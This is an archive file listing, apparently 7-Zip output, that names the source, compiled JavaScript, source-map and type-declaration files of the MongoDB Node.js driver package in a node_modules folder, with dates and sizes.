2025-06-27 14:41:06 .....        14333         3840  node_modules/mongodb/src/gridfs/download.ts
2025-06-27 14:41:06 .....        16541         4254  node_modules/mongodb/src/gridfs/upload.ts
2025-06-27 14:41:06 .....          565          369  node_modules/mongodb/src/beta.ts
2025-06-27 14:41:06 .....         4085         1150  node_modules/mongodb/src/sort.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/sdam
2025-06-27 14:41:06 .....         9593         2968  node_modules/mongodb/src/sdam/server_description.ts
2025-06-27 14:41:06 .....         4269         1076  node_modules/mongodb/src/sdam/server_selection_events.ts
2025-06-27 14:41:06 .....        19189         4178  node_modules/mongodb/src/sdam/topology_description.ts
2025-06-27 14:41:06 .....        22133         5846  node_modules/mongodb/src/sdam/monitor.ts
2025-06-27 14:41:06 .....        36154         8369  node_modules/mongodb/src/sdam/topology.ts
2025-06-27 14:41:06 .....         2052          788  node_modules/mongodb/src/sdam/common.ts
2025-06-27 14:41:06 .....        10810         2624  node_modules/mongodb/src/sdam/server_selection.ts
2025-06-27 14:41:06 .....         3406         1148  node_modules/mongodb/src/sdam/srv_polling.ts
2025-06-27 14:41:06 .....        17201         4545  node_modules/mongodb/src/sdam/server.ts
2025-06-27 14:41:06 .....         5476         1006  node_modules/mongodb/src/sdam/events.ts
2025-06-27 14:41:06 .....         5123         1414  node_modules/mongodb/src/admin.ts
2025-06-27 14:41:06 .....        36241         8134  node_modules/mongodb/src/mongo_logger.ts
2025-06-27 14:41:06 .....         5713         1339  node_modules/mongodb/src/constants.ts
2025-06-27 14:41:06 .....         9184         2261  node_modules/mongodb/src/deps.ts
2025-06-27 14:41:06 .....        44387         9146  node_modules/mongodb/src/collection.ts
2025-06-27 14:41:06 .....         5434         1573  node_modules/mongodb/src/explain.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/src/cursor
2025-06-27 14:41:06 .....         6256         1930  node_modules/mongodb/src/cursor/run_command_cursor.ts
2025-06-27 14:41:06 .....         1210          444  node_modules/mongodb/src/cursor/list_indexes_cursor.ts
2025-06-27 14:41:06 .....        41030        10411  node_modules/mongodb/src/cursor/abstract_cursor.ts
2025-06-27 14:41:06 .....         5071         1405  node_modules/mongodb/src/cursor/change_stream_cursor.ts
2025-06-27 14:41:06 .....         8487         2390  node_modules/mongodb/src/cursor/aggregation_cursor.ts
2025-06-27 14:41:06 .....         1588          563  node_modules/mongodb/src/cursor/list_collections_cursor.ts
2025-06-27 14:41:06 .....         2825          905  node_modules/mongodb/src/cursor/client_bulk_write_cursor.ts
2025-06-27 14:41:06 .....          694          319  node_modules/mongodb/src/cursor/list_search_indexes_cursor.ts
2025-06-27 14:41:06 .....        15838         4325  node_modules/mongodb/src/cursor/find_cursor.ts
2025-06-27 14:41:06 .....         2502          943  node_modules/mongodb/src/read_concern.ts
2025-06-27 14:41:06 .....        46798        13603  node_modules/mongodb/src/mongo_client.ts
2025-06-27 14:41:06 .....       350341        76350  node_modules/mongodb/mongodb.d.ts
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib
2025-06-27 14:41:06 .....        17775         4727  node_modules/mongodb/lib/db.js
2025-06-27 14:41:06 .....        20326         3974  node_modules/mongodb/lib/mongo_logger.js.map
2025-06-27 14:41:06 .....        23439         4924  node_modules/mongodb/lib/sessions.js.map
2025-06-27 14:41:06 .....         3049          943  node_modules/mongodb/lib/sort.js
2025-06-27 14:41:06 .....         2467          913  node_modules/mongodb/lib/read_concern.js
2025-06-27 14:41:06 .....        28948         6083  node_modules/mongodb/lib/mongo_logger.js
2025-06-27 14:41:06 .....         2779          835  node_modules/mongodb/lib/write_concern.js.map
2025-06-27 14:41:06 .....        39311         8636  node_modules/mongodb/lib/sessions.js
2025-06-27 14:41:06 .....         5208         1276  node_modules/mongodb/lib/read_preference.js.map
2025-06-27 14:41:06 .....         2212          731  node_modules/mongodb/lib/explain.js.map
2025-06-27 14:41:06 .....        25845         3155  node_modules/mongodb/lib/index.js
2025-06-27 14:41:06 .....        43838         9238  node_modules/mongodb/lib/connection_string.js
2025-06-27 14:41:06 .....         2549          916  node_modules/mongodb/lib/resource_management.js
2025-06-27 14:41:06 .....         3432          799  node_modules/mongodb/lib/constants.js.map
2025-06-27 14:41:06 .....        34333         6373  node_modules/mongodb/lib/connection_string.js.map
2025-06-27 14:41:06 .....         3346          917  node_modules/mongodb/lib/encrypter.js.map
2025-06-27 14:41:06 .....         4003         1266  node_modules/mongodb/lib/index.js.map
2025-06-27 14:41:06 .....         8318         1937  node_modules/mongodb/lib/timeout.js.map
2025-06-27 14:41:06 .....         3378          792  node_modules/mongodb/lib/sort.js.map
2025-06-27 14:41:06 .....        16350         2869  node_modules/mongodb/lib/error.js.map
2025-06-27 14:41:06 .....         3192          830  node_modules/mongodb/lib/deps.js.map
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/operations
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/operations/client_bulk_write
2025-06-27 14:41:06 .....          139          110  node_modules/mongodb/lib/operations/client_bulk_write/common.js.map
2025-06-27 14:41:06 .....          111          108  node_modules/mongodb/lib/operations/client_bulk_write/common.js
2025-06-27 14:41:06 .....         3825         1288  node_modules/mongodb/lib/operations/client_bulk_write/client_bulk_write.js
2025-06-27 14:41:06 .....         5019         1185  node_modules/mongodb/lib/operations/client_bulk_write/results_merger.js.map
2025-06-27 14:41:06 .....         6348         1729  node_modules/mongodb/lib/operations/client_bulk_write/executor.js
2025-06-27 14:41:06 .....         7685         1814  node_modules/mongodb/lib/operations/client_bulk_write/results_merger.js
2025-06-27 14:41:06 .....         3222         1051  node_modules/mongodb/lib/operations/client_bulk_write/executor.js.map
2025-06-27 14:41:06 .....         8464         1919  node_modules/mongodb/lib/operations/client_bulk_write/command_builder.js.map
2025-06-27 14:41:06 .....         2194          781  node_modules/mongodb/lib/operations/client_bulk_write/client_bulk_write.js.map
2025-06-27 14:41:06 .....        13741         3069  node_modules/mongodb/lib/operations/client_bulk_write/command_builder.js
2025-06-27 14:41:06 .....          755          353  node_modules/mongodb/lib/operations/stats.js.map
2025-06-27 14:41:06 .....         7298         1299  node_modules/mongodb/lib/operations/update.js.map
2025-06-27 14:41:06 .....         2466          947  node_modules/mongodb/lib/operations/distinct.js
2025-06-27 14:41:06 .....         2100          815  node_modules/mongodb/lib/operations/list_collections.js
2025-06-27 14:41:06 .....         1437          604  node_modules/mongodb/lib/operations/estimated_document_count.js
2025-06-27 14:41:06 .....         3800          964  node_modules/mongodb/lib/operations/delete.js.map
2025-06-27 14:41:06 .....         7934         1635  node_modules/mongodb/lib/operations/update.js
2025-06-27 14:41:06 .....         6153         1624  node_modules/mongodb/lib/operations/find_and_modify.js
2025-06-27 14:41:06 .....         6164         1672  node_modules/mongodb/lib/operations/execute_operation.js.map
2025-06-27 14:41:06 .....         1105          472  node_modules/mongodb/lib/operations/estimated_document_count.js.map
2025-06-27 14:41:06 .....         1365          511  node_modules/mongodb/lib/operations/set_profiling_level.js.map
2025-06-27 14:41:06 .....         1387          471  node_modules/mongodb/lib/operations/run_command.js.map
2025-06-27 14:41:06 .....         4316         1172  node_modules/mongodb/lib/operations/delete.js
2025-06-27 14:41:06 .....         1058          477  node_modules/mongodb/lib/operations/options_operation.js
2025-06-27 14:41:06 .....         3410         1044  node_modules/mongodb/lib/operations/drop.js
2025-06-27 14:41:06 .....         3601         1187  node_modules/mongodb/lib/operations/command.js
2025-06-27 14:41:06 .....          917          393  node_modules/mongodb/lib/operations/is_capped.js.map
2025-06-27 14:41:06 .....         1064          486  node_modules/mongodb/lib/operations/is_capped.js
2025-06-27 14:41:06 .....         1198          514  node_modules/mongodb/lib/operations/collections.js
2025-06-27 14:41:06 .....          880          406  node_modules/mongodb/lib/operations/stats.js
2025-06-27 14:41:06 .....         1760          706  node_modules/mongodb/lib/operations/kill_cursors.js
2025-06-27 14:41:06 .....         1601          649  node_modules/mongodb/lib/operations/list_databases.js
2025-06-27 14:41:06 .....         7094         2099  node_modules/mongodb/lib/operations/indexes.js
2025-06-27 14:41:06 .....         1191          479  node_modules/mongodb/lib/operations/bulk_write.js.map
2025-06-27 14:41:06 .....         1449          561  node_modules/mongodb/lib/operations/count.js
2025-06-27 14:41:06 .....         4022         1343  node_modules/mongodb/lib/operations/aggregate.js
2025-06-27 14:41:06 .....         3172          946  node_modules/mongodb/lib/operations/aggregate.js.map
2025-06-27 14:41:06 .....         1373          492  node_modules/mongodb/lib/operations/count.js.map
2025-06-27 14:41:06 .....          926          389  node_modules/mongodb/lib/operations/profiling_level.js.map
2025-06-27 14:41:06 .....         4545         1188  node_modules/mongodb/lib/operations/find_and_modify.js.map
2025-06-27 14:41:06 .....         3037          982  node_modules/mongodb/lib/operations/create_collection.js.map
2025-06-27 14:41:06 .....         5601         1547  node_modules/mongodb/lib/operations/find.js
2025-06-27 14:41:06 .....         1416          586  node_modules/mongodb/lib/operations/bulk_write.js
2025-06-27 14:41:06 .....         3407          983  node_modules/mongodb/lib/operations/insert.js.map
2025-06-27 14:41:06 .....         2805          839  node_modules/mongodb/lib/operations/command.js.map
2025-06-27 14:41:06 .....         1162          508  node_modules/mongodb/lib/operations/kill_cursors.js.map
2025-06-27 14:41:06 .....         5071         1189  node_modules/mongodb/lib/operations/find.js.map
2025-06-27 14:41:06 .....          913          390  node_modules/mongodb/lib/operations/options_operation.js.map
2025-06-27 14:41:06 .....         1621          612  node_modules/mongodb/lib/operations/list_collections.js.map
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/operations/search_indexes
2025-06-27 14:41:06 .....          744          390  node_modules/mongodb/lib/operations/search_indexes/update.js.map
2025-06-27 14:41:06 .....          967          410  node_modules/mongodb/lib/operations/search_indexes/update.js
2025-06-27 14:41:06 .....         1252          521  node_modules/mongodb/lib/operations/search_indexes/drop.js
2025-06-27 14:41:06 .....          820          420  node_modules/mongodb/lib/operations/search_indexes/create.js.map
2025-06-27 14:41:06 .....         1064          442  node_modules/mongodb/lib/operations/search_indexes/create.js
2025-06-27 14:41:06 .....          966          463  node_modules/mongodb/lib/operations/search_indexes/drop.js.map
2025-06-27 14:41:06 .....         1664          616  node_modules/mongodb/lib/operations/distinct.js.map
2025-06-27 14:41:06 .....         1837          647  node_modules/mongodb/lib/operations/get_more.js.map
2025-06-27 14:41:06 .....         2515          775  node_modules/mongodb/lib/operations/drop.js.map
2025-06-27 14:41:06 .....         5893         1507  node_modules/mongodb/lib/operations/indexes.js.map
2025-06-27 14:41:06 .....        10269         2962  node_modules/mongodb/lib/operations/execute_operation.js
2025-06-27 14:41:06 .....         1256          515  node_modules/mongodb/lib/operations/rename.js.map
2025-06-27 14:41:06 .....         4365         1297  node_modules/mongodb/lib/operations/insert.js
2025-06-27 14:41:06 .....         1757          653  node_modules/mongodb/lib/operations/validate_collection.js
2025-06-27 14:41:06 .....         1705          498  node_modules/mongodb/lib/operations/run_command.js
2025-06-27 14:41:06 .....         1531          585  node_modules/mongodb/lib/operations/rename.js
2025-06-27 14:41:06 .....          982          426  node_modules/mongodb/lib/operations/collections.js.map
2025-06-27 14:41:06 .....          686          349  node_modules/mongodb/lib/operations/remove_user.js.map
2025-06-27 14:41:06 .....         1326          508  node_modules/mongodb/lib/operations/list_databases.js.map
2025-06-27 14:41:06 .....         1169          489  node_modules/mongodb/lib/operations/profiling_level.js
2025-06-27 14:41:06 .....         2057          658  node_modules/mongodb/lib/operations/operation.js.map
2025-06-27 14:41:06 .....         2695          991  node_modules/mongodb/lib/operations/operation.js
2025-06-27 14:41:06 .....         1550          527  node_modules/mongodb/lib/operations/validate_collection.js.map
2025-06-27 14:41:06 .....          838          395  node_modules/mongodb/lib/operations/remove_user.js
2025-06-27 14:41:06 .....         4222         1429  node_modules/mongodb/lib/operations/create_collection.js
2025-06-27 14:41:06 .....         1712          653  node_modules/mongodb/lib/operations/set_profiling_level.js
2025-06-27 14:41:06 .....         2717         1065  node_modules/mongodb/lib/operations/get_more.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cmap
2025-06-27 14:41:06 .....         1291          429  node_modules/mongodb/lib/cmap/metrics.js.map
2025-06-27 14:41:06 .....        15266         4170  node_modules/mongodb/lib/cmap/connect.js
2025-06-27 14:41:06 .....        22738         5248  node_modules/mongodb/lib/cmap/commands.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cmap/auth
2025-06-27 14:41:06 .....         9105         2066  node_modules/mongodb/lib/cmap/auth/scram.js.map
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cmap/auth/mongodb_oidc
2025-06-27 14:41:06 .....         1594          767  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/gcp_machine_workflow.js
2025-06-27 14:41:06 .....         1249          424  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/token_cache.js.map
2025-06-27 14:41:06 .....         3297          993  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/human_callback_workflow.js.map
2025-06-27 14:41:06 .....         6069         1969  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/callback_workflow.js
2025-06-27 14:41:06 .....         1610          625  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/command_builders.js
2025-06-27 14:41:06 .....         2569         1058  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/azure_machine_workflow.js
2025-06-27 14:41:06 .....          808          366  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/k8s_machine_workflow.js.map
2025-06-27 14:41:06 .....         1502          473  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/token_cache.js
2025-06-27 14:41:06 .....         2156          742  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/automated_callback_workflow.js.map
2025-06-27 14:41:06 .....         1697          627  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/azure_machine_workflow.js.map
2025-06-27 14:41:06 .....         1006          407  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/command_builders.js.map
2025-06-27 14:41:06 .....         3429         1098  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/callback_workflow.js.map
2025-06-27 14:41:06 .....         5847         1517  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/human_callback_workflow.js
2025-06-27 14:41:06 .....         3274         1078  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/automated_callback_workflow.js
2025-06-27 14:41:06 .....          829          456  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/token_machine_workflow.js
2025-06-27 14:41:06 .....         1109          535  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/k8s_machine_workflow.js
2025-06-27 14:41:06 .....          588          313  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/token_machine_workflow.js.map
2025-06-27 14:41:06 .....         1088          475  node_modules/mongodb/lib/cmap/auth/mongodb_oidc/gcp_machine_workflow.js.map
2025-06-27 14:41:06 .....         1993          651  node_modules/mongodb/lib/cmap/auth/mongodb_oidc.js.map
2025-06-27 14:41:06 .....         1417          529  node_modules/mongodb/lib/cmap/auth/x509.js
2025-06-27 14:41:06 .....          541          278  node_modules/mongodb/lib/cmap/auth/providers.js.map
2025-06-27 14:41:06 .....         6334         2009  node_modules/mongodb/lib/cmap/auth/mongodb_aws.js
2025-06-27 14:41:06 .....         1476          563  node_modules/mongodb/lib/cmap/auth/auth_provider.js
2025-06-27 14:41:06 .....         1096          422  node_modules/mongodb/lib/cmap/auth/x509.js.map
2025-06-27 14:41:06 .....          997          477  node_modules/mongodb/lib/cmap/auth/plain.js
2025-06-27 14:41:06 .....          775          342  node_modules/mongodb/lib/cmap/auth/providers.js
2025-06-27 14:41:06 .....         3008          946  node_modules/mongodb/lib/cmap/auth/aws_temporary_credentials.js.map
2025-06-27 14:41:06 .....          744          346  node_modules/mongodb/lib/cmap/auth/plain.js.map
2025-06-27 14:41:06 .....         9752         2802  node_modules/mongodb/lib/cmap/auth/scram.js
2025-06-27 14:41:06 .....         4351         1313  node_modules/mongodb/lib/cmap/auth/mongodb_aws.js.map
2025-06-27 14:41:06 .....         5756         1813  node_modules/mongodb/lib/cmap/auth/gssapi.js
2025-06-27 14:41:06 .....         3290          957  node_modules/mongodb/lib/cmap/auth/mongodb_oidc.js
2025-06-27 14:41:06 .....         6529         2101  node_modules/mongodb/lib/cmap/auth/aws_temporary_credentials.js
2025-06-27 14:41:06 .....         8786         2198  node_modules/mongodb/lib/cmap/auth/mongo_credentials.js
2025-06-27 14:41:06 .....          846          388  node_modules/mongodb/lib/cmap/auth/auth_provider.js.map
2025-06-27 14:41:06 .....         5927         1451  node_modules/mongodb/lib/cmap/auth/mongo_credentials.js.map
2025-06-27 14:41:06 .....         4633         1344  node_modules/mongodb/lib/cmap/auth/gssapi.js.map
2025-06-27 14:41:06 .....         2591          885  node_modules/mongodb/lib/cmap/stream_description.js
2025-06-27 14:41:06 .....        23831         5193  node_modules/mongodb/lib/cmap/connection_pool.js
2025-06-27 14:41:06 .....         1931          542  node_modules/mongodb/lib/cmap/metrics.js
2025-06-27 14:41:06 .....        19242         3540  node_modules/mongodb/lib/cmap/commands.js.map
2025-06-27 14:41:06 .....        11478         2796  node_modules/mongodb/lib/cmap/connect.js.map
2025-06-27 14:41:06 .....        16696         3578  node_modules/mongodb/lib/cmap/connection_pool.js.map
2025-06-27 14:41:06 .....         3273          780  node_modules/mongodb/lib/cmap/connection_pool_events.js.map
2025-06-27 14:41:06 .....         2003          667  node_modules/mongodb/lib/cmap/stream_description.js.map
2025-06-27 14:41:06 .....         7711         1960  node_modules/mongodb/lib/cmap/command_monitoring_events.js
2025-06-27 14:41:06 .....         6366          996  node_modules/mongodb/lib/cmap/connection_pool_events.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cmap/wire_protocol
2025-06-27 14:41:06 .....         1660          614  node_modules/mongodb/lib/cmap/wire_protocol/shared.js
2025-06-27 14:41:06 .....          550          218  node_modules/mongodb/lib/cmap/wire_protocol/constants.js.map
2025-06-27 14:41:06 .....         3962         1328  node_modules/mongodb/lib/cmap/wire_protocol/on_data.js
2025-06-27 14:41:06 .....         4454         1224  node_modules/mongodb/lib/cmap/wire_protocol/compression.js.map
2025-06-27 14:41:06 .....          939          312  node_modules/mongodb/lib/cmap/wire_protocol/constants.js
2025-06-27 14:41:06 .....        11886         3158  node_modules/mongodb/lib/cmap/wire_protocol/responses.js
2025-06-27 14:41:06 .....         2665          810  node_modules/mongodb/lib/cmap/wire_protocol/on_data.js.map
2025-06-27 14:41:06 .....         1106          451  node_modules/mongodb/lib/cmap/wire_protocol/shared.js.map
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cmap/wire_protocol/on_demand
2025-06-27 14:41:06 .....         6854         1576  node_modules/mongodb/lib/cmap/wire_protocol/on_demand/document.js.map
2025-06-27 14:41:06 .....         9368         2448  node_modules/mongodb/lib/cmap/wire_protocol/on_demand/document.js
2025-06-27 14:41:06 .....         8825         1984  node_modules/mongodb/lib/cmap/wire_protocol/responses.js.map
2025-06-27 14:41:06 .....         5816         1714  node_modules/mongodb/lib/cmap/wire_protocol/compression.js
2025-06-27 14:41:06 .....        18501         4315  node_modules/mongodb/lib/cmap/connection.js.map
2025-06-27 14:41:06 .....         3506          834  node_modules/mongodb/lib/cmap/errors.js
2025-06-27 14:41:06 .....         1319          466  node_modules/mongodb/lib/cmap/errors.js.map
2025-06-27 14:41:06 .....        26229         6619  node_modules/mongodb/lib/cmap/connection.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cmap/handshake
2025-06-27 14:41:06 .....         7312         1761  node_modules/mongodb/lib/cmap/handshake/client_metadata.js.map
2025-06-27 14:41:06 .....         8977         2757  node_modules/mongodb/lib/cmap/handshake/client_metadata.js
2025-06-27 14:41:06 .....         5722         1345  node_modules/mongodb/lib/cmap/command_monitoring_events.js.map
2025-06-27 14:41:06 .....         2407          753  node_modules/mongodb/lib/bson.js.map
2025-06-27 14:41:06 .....         6506         1670  node_modules/mongodb/lib/db.js.map
2025-06-27 14:41:06 .....         4015         1301  node_modules/mongodb/lib/write_concern.js
2025-06-27 14:41:06 .....         3902         1196  node_modules/mongodb/lib/mongo_client_auth_providers.js
2025-06-27 14:41:06 .....        32054         7101  node_modules/mongodb/lib/collection.js
2025-06-27 14:41:06 .....         5551         1177  node_modules/mongodb/lib/bson.js
2025-06-27 14:41:06 .....        12082         2449  node_modules/mongodb/lib/collection.js.map
2025-06-27 14:41:06 .....        27108         7933  node_modules/mongodb/lib/mongo_client.js
2025-06-27 14:41:06 .....          677          417  node_modules/mongodb/lib/beta.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/bulk
2025-06-27 14:41:06 .....        24337         4623  node_modules/mongodb/lib/bulk/common.js.map
2025-06-27 14:41:06 .....         4144         1239  node_modules/mongodb/lib/bulk/unordered.js
2025-06-27 14:41:06 .....         3166          814  node_modules/mongodb/lib/bulk/unordered.js.map
2025-06-27 14:41:06 .....        32799         6925  node_modules/mongodb/lib/bulk/common.js
2025-06-27 14:41:06 .....         2212          695  node_modules/mongodb/lib/bulk/ordered.js.map
2025-06-27 14:41:06 .....         3131         1082  node_modules/mongodb/lib/bulk/ordered.js
2025-06-27 14:41:06 .....         1009          385  node_modules/mongodb/lib/resource_management.js.map
2025-06-27 14:41:06 .....        44329         6939  node_modules/mongodb/lib/error.js
2025-06-27 14:41:06 .....        12007         2515  node_modules/mongodb/lib/change_stream.js.map
2025-06-27 14:41:06 .....         7201         1622  node_modules/mongodb/lib/constants.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/client-side-encryption
2025-06-27 14:41:06 .....        12855         2575  node_modules/mongodb/lib/client-side-encryption/client_encryption.js.map
2025-06-27 14:41:06 .....        12421         3441  node_modules/mongodb/lib/client-side-encryption/auto_encrypter.js
2025-06-27 14:41:06 .....         6488         1660  node_modules/mongodb/lib/client-side-encryption/auto_encrypter.js.map
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/client-side-encryption/providers
2025-06-27 14:41:06 .....         3078          982  node_modules/mongodb/lib/client-side-encryption/providers/azure.js.map
2025-06-27 14:41:06 .....         1630          624  node_modules/mongodb/lib/client-side-encryption/providers/index.js
2025-06-27 14:41:06 .....          990          401  node_modules/mongodb/lib/client-side-encryption/providers/index.js.map
2025-06-27 14:41:06 .....          498          280  node_modules/mongodb/lib/client-side-encryption/providers/gcp.js.map
2025-06-27 14:41:06 .....          578          332  node_modules/mongodb/lib/client-side-encryption/providers/gcp.js
2025-06-27 14:41:06 .....         1154          566  node_modules/mongodb/lib/client-side-encryption/providers/aws.js
2025-06-27 14:41:06 .....          643          355  node_modules/mongodb/lib/client-side-encryption/providers/aws.js.map
2025-06-27 14:41:06 .....         4550         1609  node_modules/mongodb/lib/client-side-encryption/providers/azure.js
2025-06-27 14:41:06 .....         2633          778  node_modules/mongodb/lib/client-side-encryption/crypto_callbacks.js
2025-06-27 14:41:06 .....         3960         1466  node_modules/mongodb/lib/client-side-encryption/mongocryptd_manager.js
2025-06-27 14:41:06 .....         4497          855  node_modules/mongodb/lib/client-side-encryption/errors.js
2025-06-27 14:41:06 .....        19688         5094  node_modules/mongodb/lib/client-side-encryption/state_machine.js
2025-06-27 14:41:06 .....         2561          634  node_modules/mongodb/lib/client-side-encryption/crypto_callbacks.js.map
2025-06-27 14:41:06 .....         1429          474  node_modules/mongodb/lib/client-side-encryption/errors.js.map
2025-06-27 14:41:06 .....        26721         5403  node_modules/mongodb/lib/client-side-encryption/client_encryption.js
2025-06-27 14:41:06 .....         2187          756  node_modules/mongodb/lib/client-side-encryption/mongocryptd_manager.js.map
2025-06-27 14:41:06 .....        12135         2929  node_modules/mongodb/lib/client-side-encryption/state_machine.js.map
2025-06-27 14:41:06 .....         2113          554  node_modules/mongodb/lib/admin.js.map
2025-06-27 14:41:06 .....          385          218  node_modules/mongodb/lib/beta.js.map
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/gridfs
2025-06-27 14:41:06 .....         6928         1965  node_modules/mongodb/lib/gridfs/index.js
2025-06-27 14:41:06 .....        13932         3368  node_modules/mongodb/lib/gridfs/upload.js
2025-06-27 14:41:06 .....         4572         1173  node_modules/mongodb/lib/gridfs/index.js.map
2025-06-27 14:41:06 .....        11820         2960  node_modules/mongodb/lib/gridfs/download.js
2025-06-27 14:41:06 .....        11549         2428  node_modules/mongodb/lib/gridfs/upload.js.map
2025-06-27 14:41:06 .....        10354         2047  node_modules/mongodb/lib/gridfs/download.js.map
2025-06-27 14:41:06 .....        10654         2620  node_modules/mongodb/lib/mongo_client.js.map
2025-06-27 14:41:06 .....        11111         2602  node_modules/mongodb/lib/timeout.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/sdam
2025-06-27 14:41:06 .....        24075         5062  node_modules/mongodb/lib/sdam/topology.js.map
2025-06-27 14:41:06 .....         2916          847  node_modules/mongodb/lib/sdam/srv_polling.js.map
2025-06-27 14:41:06 .....         1053          407  node_modules/mongodb/lib/sdam/common.js.map
2025-06-27 14:41:06 .....        10400         2515  node_modules/mongodb/lib/sdam/server_selection.js
2025-06-27 14:41:06 .....         2275          599  node_modules/mongodb/lib/sdam/events.js.map
2025-06-27 14:41:06 .....         7163         1722  node_modules/mongodb/lib/sdam/server_selection.js.map
2025-06-27 14:41:06 .....         3335         1091  node_modules/mongodb/lib/sdam/srv_polling.js
2025-06-27 14:41:06 .....         1660          529  node_modules/mongodb/lib/sdam/server_selection_events.js.map
2025-06-27 14:41:06 .....         1572          584  node_modules/mongodb/lib/sdam/common.js
2025-06-27 14:41:06 .....        19413         3925  node_modules/mongodb/lib/sdam/topology_description.js
2025-06-27 14:41:06 .....         4545          884  node_modules/mongodb/lib/sdam/events.js
2025-06-27 14:41:06 .....         6477         1503  node_modules/mongodb/lib/sdam/server_description.js.map
2025-06-27 14:41:06 .....        16778         3691  node_modules/mongodb/lib/sdam/monitor.js.map
2025-06-27 14:41:06 .....        13434         2713  node_modules/mongodb/lib/sdam/topology_description.js.map
2025-06-27 14:41:06 .....        15643         3780  node_modules/mongodb/lib/sdam/server.js
2025-06-27 14:41:06 .....        11840         2734  node_modules/mongodb/lib/sdam/server.js.map
2025-06-27 14:41:06 .....         3174          730  node_modules/mongodb/lib/sdam/server_selection_events.js
2025-06-27 14:41:06 .....         8486         2474  node_modules/mongodb/lib/sdam/server_description.js
2025-06-27 14:41:06 .....        21641         5264  node_modules/mongodb/lib/sdam/monitor.js
2025-06-27 14:41:06 .....        32873         6993  node_modules/mongodb/lib/sdam/topology.js
2025-06-27 14:41:06 .....         1367          488  node_modules/mongodb/lib/read_concern.js.map
2025-06-27 14:41:06 .....         1866          632  node_modules/mongodb/lib/mongo_types.js
2025-06-27 14:41:06 .....        18048         3837  node_modules/mongodb/lib/change_stream.js
2025-06-27 14:41:06 .....         4769         1361  node_modules/mongodb/lib/admin.js
2025-06-27 14:41:06 .....         3226         1022  node_modules/mongodb/lib/explain.js
2025-06-27 14:41:06 .....        31077         6733  node_modules/mongodb/lib/utils.js.map
2025-06-27 14:41:06 .....         1410          507  node_modules/mongodb/lib/mongo_types.js.map
2025-06-27 14:41:06 .....         8110         1916  node_modules/mongodb/lib/read_preference.js
2025-06-27 14:41:06 .....         5469         1197  node_modules/mongodb/lib/deps.js
2025-06-27 14:41:06 .....         2147          742  node_modules/mongodb/lib/mongo_client_auth_providers.js.map
2025-06-27 14:41:06 .....       351551        76760  node_modules/mongodb/lib/beta.d.ts
2025-06-27 14:41:06 .....         3436          988  node_modules/mongodb/lib/transactions.js.map
2025-06-27 14:41:06 .....         5049         1260  node_modules/mongodb/lib/transactions.js
2025-06-27 14:41:06 .....        42396        12315  node_modules/mongodb/lib/utils.js
2025-06-27 14:41:06 D....            0            0  node_modules/mongodb/lib/cursor
2025-06-27 14:41:06 .....         6767         1965  node_modules/mongodb/lib/cursor/aggregation_cursor.js
2025-06-27 14:41:06 .....        15406         3972  node_modules/mongodb/lib/cursor/find_cursor.js
2025-06-27 14:41:06 .....         7760         1721  node_modules/mongodb/lib/cursor/find_cursor.js.map
2025-06-27 14:41:06 .....        36440         8478  node_modules/mongodb/lib/cursor/abstract_cursor.js
2025-06-27 14:41:06 .....         4174         1080  node_modules/mongodb/lib/cursor/change_stream_cursor.js
2025-06-27 14:41:06 .....          639          331  node_modules/mongodb/lib/cursor/list_search_indexes_cursor.js
2025-06-27 14:41:06 .....         1218          473  node_modules/mongodb/lib/cursor/list_indexes_cursor.js
2025-06-27 14:41:06 .....         1298          535  node_modules/mongodb/lib/cursor/client_bulk_write_cursor.js.map
2025-06-27 14:41:06 .....         1056          415  node_modules/mongodb/lib/cursor/list_collections_cursor.js.map
2025-06-27 14:41:06 .....         4020         1148  node_modules/mongodb/lib/cursor/run_command_cursor.js
2025-06-27 14:41:06 .....         2135          758  node_modules/mongodb/lib/cursor/client_bulk_write_cursor.js
2025-06-27 14:41:06 .....        22822         4605  node_modules/mongodb/lib/cursor/abstract_cursor.js.map
2025-06-27 14:41:06 .....         1338          493  node_modules/mongodb/lib/cursor/list_collections_cursor.js
2025-06-27 14:41:06 .....          539          276  node_modules/mongodb/lib/cursor/list_search_indexes_cursor.js.map
2025-06-27 14:41:06 .....         3458          961  node_modules/mongodb/lib/cursor/change_stream_cursor.js.map
2025-06-27 14:41:06 .....          931          394  node_modules/mongodb/lib/cursor/list_indexes_cursor.js.map
2025-06-27 14:41:06 .....         3718         1000  node_modules/mongodb/lib/cursor/aggregation_cursor.js.map
2025-06-27 14:41:06 .....         2140          727  node_modules/mongodb/lib/cursor/run_command_cursor.js.map
2025-06-27 14:41:06 .....         4488         1267  node_modules/mongodb/lib/encrypter.js
2025-06-27 14:41:06 .....         7144         1988  node_modules/mongodb/package.json
